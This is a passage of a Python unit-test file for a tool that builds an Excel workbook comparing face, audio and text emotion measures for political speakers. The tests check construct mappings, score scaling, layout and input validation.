        comparison = book["Construct Comparison"]
        positive_row = next(
            row
            for row in range(7, comparison.max_row + 1)
            if comparison.cell(row, 1).value == "Positive Sentiment"
        )
        self.assertIn("'Text sentiment'!D2", comparison.cell(positive_row, 4).value)
        self.assertNotIn("'Text sentiment'!D4", comparison.cell(positive_row, 4).value)
        self.assertIn("'Video'!D6", comparison.cell(positive_row, 2).value)
        self.assertEqual(
            comparison.cell(positive_row, 6).value,
            "Face: Joy 36.00\nText: Positive Sentiment 20.00\nAudio: Joy 16.00",
        )
        self.assertEqual(
            comparison.cell(positive_row, 7).value,
            "Face: Joy 36.00\nText: Positive Sentiment 20.00\nAudio: Joy 16.00",
        )
        valence_row = next(
            row
            for row in range(7, comparison.max_row + 1)
            if comparison.cell(row, 1).value == "Valence"
        )
        self.assertIn("'Video'!D12", comparison.cell(valence_row, 2).value)
        self.assertIn("'Video'!D13", comparison.cell(valence_row, 2).value)
        self.assertIn("'Audio'!D11", comparison.cell(valence_row, 3).value)
        self.assertIn("'Text sentiment'!D4", comparison.cell(valence_row, 4).value)
        self.assertEqual(
            comparison.cell(valence_row, 6).value,
            "Face: Valence 42.00\nText: Text Valence 33.33\nAudio: Valence 21.00",
        )
        self.assertEqual(
            comparison.cell(valence_row, 7).value,
            "Face: Adaptive Valence 43.00\nText: Text Valence 33.33\nAudio: Valence 21.00",
        )
        self.assertNotIn("Text|Positive Sentiment", result.source_cells)

    def test_construct_boxes_classify_every_non_au_measure_exactly_once(self) -> None:
        expected_mapping = {
            "Positive Sentiment": {
                "Video": ("Joy",),
                "Audio": ("Joy",),
                "Text": ("Positive Sentiment",),
            },
            "Negative Sentiment": {
                "Video": ("Anger", "Contempt", "Disgust", "Fear", "Sadness"),
                "Audio": ("Anger", "Contempt", "Disgust", "Fear", "Sadness"),
                "Text": ("Negative Sentiment",),
            },
            "Neutral / Other": {
                "Video": ("Neutral", "Confusion", "Sentimentality"),
                "Audio": ("Neutral", "Other"),
                "Text": (),
            },
            "Arousal / Activation": {
                "Video": ("Surprise", "Arousal", "Engagement", "Adaptive Engagement"),
                "Audio": ("Surprise", "Arousal"),
                "Text": ("Arousal / Activation",),
            },
            "Valence": {
                "Video": ("Valence", "Adaptive Valence"),
                "Audio": ("Valence",),
                "Text": ("Text Valence",),
            },
            "Dominance / Power": {
                "Video": (),
                "Audio": ("Dominance",),
                "Text": ("Dominance / Power",),
            },
            "Affiliation / Social orientation": {
                "Video": (),
                "Audio": (),
                "Text": ("Affiliation / Social orientation",),
            },
        }
        self.assertEqual(
            {
                construct.label: {
                    "Video": tuple(metric for _, metric in construct.video_metrics),
                    "Audio": tuple(metric for _, metric in construct.audio_metrics),
                    "Text": tuple(metric for _, metric in construct.text_metrics),
                }
                for construct in COMPARISON_CONSTRUCTS
            },
            expected_mapping,
        )
        assigned_by_modality = {
            "Video": tuple(
                metric
                for construct in COMPARISON_CONSTRUCTS
                for _, metric in construct.video_metrics
            ),
            "Audio": tuple(
                metric
                for construct in COMPARISON_CONSTRUCTS
                for _, metric in construct.audio_metrics
            ),
            "Text": tuple(
                metric
                for construct in COMPARISON_CONSTRUCTS
                for _, metric in construct.text_metrics
            ),
        }
        self.assertEqual(Counter(assigned_by_modality["Video"]), Counter(VIDEO_METRICS))
        self.assertEqual(Counter(assigned_by_modality["Audio"]), Counter(AUDIO_METRICS))
        self.assertEqual(
            Counter(assigned_by_modality["Text"]),
            Counter((*TEXT_SENTIMENT, *TEXT_DIMENSIONS)),
        )
        self.assertTrue(
            all(
                count == 1
                for assigned in assigned_by_modality.values()
                for count in Counter(assigned).values()
            )
        )
        groups = (SpeakerGroupDefinition("uk", "United Kingdom", ("Andy Burnham",)),)
        text_summary = TextConstructSummary(
            speaker_id="andy_burnham",
            display_name="Andy Burnham",
            country="United Kingdom",
            constructs={
                "Positive Sentiment": 0.20,
                "Negative Sentiment": 0.10,
                "Arousal / Activation": 0.30,
                "Dominance / Power": 0.40,
                "Affiliation / Social orientation": 0.50,
            },
            source_path=self.root / "speaker_level_summary.csv",
        )
        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
            speaker_groups=groups,
            text_summaries=(text_summary,),
            include_construct_comparison=True,
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        comparison = book["Construct Comparison"]
        boxes = {
            "Video": [str(comparison.cell(row, 2).value or "") for row in range(7, 14)],
            "Audio": [str(comparison.cell(row, 3).value or "") for row in range(7, 14)],
            "Text": [str(comparison.cell(row, 4).value or "") for row in range(7, 14)],
        }
        for modality, metrics in (
            ("Video", VIDEO_METRICS),
            ("Audio", AUDIO_METRICS),
        ):
            for metric in metrics:
                cells = result.source_cells[f"{modality}|{metric}"]
                reference = f"'{cells.sheet}'!{cells.speaker_cells[0]}"
                self.assertEqual(
                    sum(reference in box for box in boxes[modality]),
                    1,
                    f"{modality} {metric} must occur in exactly one construct box",
                )
        for index, construct in enumerate((*TEXT_SENTIMENT, *TEXT_DIMENSIONS), start=2):
            reference = f"'Text sentiment'!D{index}"
            self.assertEqual(
                sum(reference in box for box in boxes["Text"]),
                1,
                f"Text {construct} must occur in exactly one construct box",
            )

    def test_negative_text_scores_are_scaled_without_changing_sign(self) -> None:
        groups = (SpeakerGroupDefinition("uk", "United Kingdom", ("Andy Burnham",)),)
        text_summary = TextConstructSummary(
            speaker_id="andy_burnham",
            display_name="Andy Burnham",
            country="United Kingdom",
            constructs={
                "Positive Sentiment": 0.20,
                "Negative Sentiment": 0.10,
                "Arousal / Activation": -0.25,
                "Dominance / Power": 0.40,
                "Affiliation / Social orientation": 0.50,
            },
            source_path=self.root / "speaker_level_summary.csv",
        )

        result = build_combined_workbook(
            {},
            self.output_path,
            speaker_groups=groups,
            text_summaries=(text_summary,),
            include_construct_comparison=True,
        )

        text_sheet = openpyxl.load_workbook(result.workbook_path, data_only=False)["Text sentiment"]
        self.assertEqual(text_sheet["D5"].value, -25.0)

    def test_missing_text_measure_is_hidden_from_its_box_and_extrema(self) -> None:
        groups = (SpeakerGroupDefinition("uk", "United Kingdom", ("Andy Burnham",)),)
        text_summary = TextConstructSummary(
            speaker_id="andy_burnham",
            display_name="Andy Burnham",
            country="United Kingdom",
            constructs={
                "Positive Sentiment": 0.20,
                "Negative Sentiment": None,
                "Arousal / Activation": 0.30,
                "Dominance / Power": 0.40,
                "Affiliation / Social orientation": 0.50,
            },
            source_path=self.root / "speaker_level_summary.csv",
        )

        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
            speaker_groups=groups,
            text_summaries=(text_summary,),
            include_construct_comparison=True,
        )

        comparison = openpyxl.load_workbook(result.workbook_path, data_only=False)[
            "Construct Comparison"
        ]
        valence_row = next(
            row
            for row in range(7, comparison.max_row + 1)
            if comparison.cell(row, 1).value == "Valence"
        )
        self.assertIsNone(comparison.cell(valence_row, 4).value)
        self.assertNotIn("Text Valence", comparison.cell(valence_row, 6).value)
        self.assertNotIn("Text Valence", comparison.cell(valence_row, 7).value)
        self.assertEqual(
            comparison.cell(valence_row, 6).value,
            "Face: Valence 42.00\nAudio: Valence 21.00",
        )
        self.assertEqual(
            comparison.cell(valence_row, 7).value,
            "Face: Adaptive Valence 43.00\nAudio: Valence 21.00",
        )

    def test_every_speaker_panel_has_four_column_ranked_suffix(self) -> None:
        self._write_report(self.audio_emotion_root, "Nigel Farage", AUDIO_METRICS, 50)
        self._write_report(self.video_emotion_root, "Nigel Farage", VIDEO_METRICS, 60)
        speakers = ("Andy Burnham", "Marine Le Pen", "Nigel Farage")
        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
            speaker_groups=(SpeakerGroupDefinition("sample", "Sample", speakers),),
            include_construct_comparison=True,
        )

        comparison = openpyxl.load_workbook(result.workbook_path, data_only=False)[
            "Construct Comparison"
        ]
        for start, speaker in zip((1, 9, 17), speakers):
            self.assertEqual(comparison.cell(5, start).value, speaker)
            self.assertEqual(
                [comparison.cell(6, start + offset).value for offset in range(8)],
                ["Psychological construct", "Face", "Audio", "Text", None, "Min", "Max", None],
            )
            self.assertTrue(comparison.cell(7, start + 5).value)
            self.assertTrue(comparison.cell(7, start + 6).value)
        self.assertGreaterEqual(comparison.max_column, 24)

    def test_equal_extrema_use_face_audio_text_tie_order(self) -> None:
        self._write_report(self.video_emotion_root, "Andy Burnham", VIDEO_METRICS, 10)
        groups = (SpeakerGroupDefinition("uk", "United Kingdom", ("Andy Burnham",)),)
        text_summary = TextConstructSummary(
            speaker_id="andy_burnham",
            display_name="Andy Burnham",
            country="United Kingdom",
            constructs={
                "Positive Sentiment": 0.16,
                "Negative Sentiment": 0.0,
                "Arousal / Activation": 0.30,
                "Dominance / Power": 0.40,
                "Affiliation / Social orientation": 0.50,
            },
            source_path=self.root / "speaker_level_summary.csv",
        )
        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
            speaker_groups=groups,
            text_summaries=(text_summary,),
            include_construct_comparison=True,
        )

        comparison = openpyxl.load_workbook(result.workbook_path, data_only=False)[
            "Construct Comparison"
        ]
        self.assertEqual(
            comparison["F7"].value,
            "Face: Joy 16.00\nAudio: Joy 16.00\nText: Positive Sentiment 16.00",
        )

    def test_headline_policy_defaults_to_observation_weighting_and_allows_equal_videos(self) -> None:
        report = (
            self.video_emotion_root
            / "emotion"
            / "Andy Burnham"
            / "combined"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        write_sectioned_report(report, VIDEO_METRICS, 10, counts=[100, 1, 1, 1, 1])
        groups = (SpeakerGroupDefinition("uk", "United Kingdom", ("Andy Burnham",)),)

        weighted = build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            self.output_path,
            speaker_groups=groups,
            headline_policy="weighted",
        )
        equal_path = self.root / "equal.xlsx"
        build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            equal_path,
            speaker_groups=groups,
            headline_policy="equal",
        )

        weighted_value = openpyxl.load_workbook(weighted.workbook_path, data_only=False)["Video"]["D2"].value
        equal_value = openpyxl.load_workbook(equal_path, data_only=False)["Video"]["D2"].value
        self.assertAlmostEqual(weighted_value, 10.096153846153847)
        self.assertEqual(equal_value, 12.0)

    def test_multiple_long_group_names_are_kept_inside_one_modality_sheet(self) -> None:
        groups = (
            SpeakerGroupDefinition("first", "A very long group name with a shared prefix one", ("Andy Burnham",)),
            SpeakerGroupDefinition("second", "A very long group name with a shared prefix two", ("Marine Le Pen",)),
        )

        result = build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            self.output_path,
            speaker_groups=groups,
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        self.assertEqual(result.quantitative_sheets, ("Video",))
        self.assertEqual(book["Video"]["B1"].value, groups[0].name)
        self.assertEqual(book["Video"]["G1"].value, groups[1].name)

    def test_case_only_group_names_do_not_create_extra_sheets(self) -> None:
        name = "X" * 23
        groups = (
            SpeakerGroupDefinition("first", name, ("Andy Burnham",)),
            SpeakerGroupDefinition("second", name.lower(), ("Marine Le Pen",)),
        )

        result = build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            self.output_path,
            speaker_groups=groups,
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        self.assertEqual(result.quantitative_sheets, ("Video",))
        self.assertEqual(book["Video"]["B1"].value, name)
        self.assertEqual(book["Video"]["G1"].value, name.lower())

    def test_rejects_invalid_speaker_group_definitions(self) -> None:
        source_mapping = {"video": discover_combined_sources(self.video_emotion_root, "video")}
        invalid_groups = (
            ("duplicate ids", (
                SpeakerGroupDefinition("same", "First", ("Andy Burnham",)),
                SpeakerGroupDefinition("same", "Second", ("Marine Le Pen",)),
            )),
            ("duplicate names", (
                SpeakerGroupDefinition("first", "Same", ("Andy Burnham",)),
                SpeakerGroupDefinition("second", "Same", ("Marine Le Pen",)),
            )),
            ("duplicate memberships", (
                SpeakerGroupDefinition("first", "First", ("Andy Burnham",)),
                SpeakerGroupDefinition("second", "Second", ("Andy Burnham",)),
            )),
            ("blank group", (SpeakerGroupDefinition("", "First", ("Andy Burnham",)),)),
            ("empty membership", (SpeakerGroupDefinition("first", "First", ()),)),
        )

        for label, groups in invalid_groups:
            with self.subTest(label=label), self.assertRaises(InputError):
                build_combined_workbook(source_mapping, self.output_path, speaker_groups=groups)

    def test_explicit_empty_speaker_groups_are_rejected_before_writing(self) -> None:
        source_mapping = {"video": discover_combined_sources(self.video_emotion_root, "video")}

        for index, groups in enumerate(((), []), start=1):
            destination = self.root / f"empty-groups-{index}.xlsx"
            with self.subTest(groups=type(groups).__name__), self.assertRaisesRegex(
                InputError,
                "speaker group",
            ):
                build_combined_workbook(source_mapping, destination, speaker_groups=groups)
            self.assertFalse(destination.exists())

    def test_missing_group_speaker_in_modality_stays_blank_and_is_excluded_from_overall(self) -> None:
        group = SpeakerGroupDefinition(
            "uk", "United Kingdom", ("Andy Burnham", "Zack Polanski")
        )

        result = build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            self.output_path,
            speaker_groups=(group,),
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        self.assertIsNone(book["Video"]["E2"].value)
        self.assertEqual(book["Video"]["S2"].value, "=AVERAGE(D2)")
        self.assertTrue(any("Zack Polanski" in warning for warning in result.warnings))

    def test_builds_only_available_quantitative_sheets(self) -> None:
        video_sources = discover_combined_sources(self.video_emotion_root, "video")
        video_result = build_combined_workbook({"video": video_sources}, self.output_path)
        video_book = openpyxl.load_workbook(video_result.workbook_path, data_only=False)

        self.assertIn("Video", video_book.sheetnames)
        self.assertNotIn("Audio", video_book.sheetnames)
        self.assertEqual(video_result.quantitative_sheets, ("Video",))
        self.assertEqual(
            video_book.sheetnames,
            ["Domain Def Text", "Video", "Domain Def Speech", "Measure Guide", "Text sentiment"],
        )

        audio_result = build_combined_workbook(
            {"audio": discover_combined_sources(self.audio_emotion_root, "audio")},
            self.root / "audio-summary.xlsx",
        )
        audio_book = openpyxl.load_workbook(audio_result.workbook_path, data_only=False)
        self.assertEqual(audio_result.quantitative_sheets, ("Audio",))
        self.assertEqual(
            audio_book.sheetnames,
            ["Audio", "Domain Def Text", "Domain Def Speech", "Measure Guide", "Text sentiment"],
        )

    def test_default_headline_layout_and_mean_of_means_coordinates(self) -> None:
        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
        )
        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        video_anger = result.source_cells["Video|Anger"]
        audio_anger = result.source_cells["Audio|Anger"]

        self.assertEqual(
            book.sheetnames,
            ["Audio", "Domain Def Text", "Video", "Domain Def Speech", "Measure Guide", "Text sentiment"],
        )
        self.assertEqual(book["Video"]["S2"].value, "=AVERAGE(D2,E2)")
        self.assertEqual(book["Audio"]["S2"].value, "=AVERAGE(D2,E2)")
        self.assertEqual(video_anger.overall, "S2")
        self.assertEqual(audio_anger.overall, "S2")
        self.assertEqual(video_anger.speaker_cells, ("D2", "E2"))
        self.assertEqual(video_anger.speaker_ids, ("andyburnham", "marinelepen"))
        self.assertEqual(len(video_anger.speaker_cells), len(video_anger.speaker_ids))
        self.assertEqual(book["Video"]["D2"].number_format, "0.00")
        self.assertEqual(book["Video"].freeze_panes, "B2")
        self.assertEqual(list(book["Video"].merged_cells.ranges), [])
        self.assertTrue(book.calculation.fullCalcOnLoad)
        self.assertTrue(book.calculation.forceFullCalc)

    def test_ports_static_definition_sheet_values_and_fonts(self) -> None:
        result = build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            self.output_path,
        )
        book = openpyxl.load_workbook(result.workbook_path, data_only=False)

        self.assertEqual(book["Domain Def Text"]["A1"].value, "terms in general inquirer")
        self.assertEqual(book["Domain Def Text"]["A1"].font.name, "Aptos Narrow")
        self.assertEqual(book["Domain Def Text"]["A1"].font.sz, 11)

    def test_does_not_write_the_manual_reference_workbooks(self) -> None:
        reference_paths = tuple(
            workbook
            for path in protected_manual_discovery_directories(__file__)
            for workbook in path.glob("*.xlsx")
        )
        before = {path: path.stat().st_mtime_ns for path in reference_paths}

        build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            self.output_path,
        )

        self.assertEqual({path: path.stat().st_mtime_ns for path in reference_paths}, before)


if __name__ == "__main__":
    unittest.main()
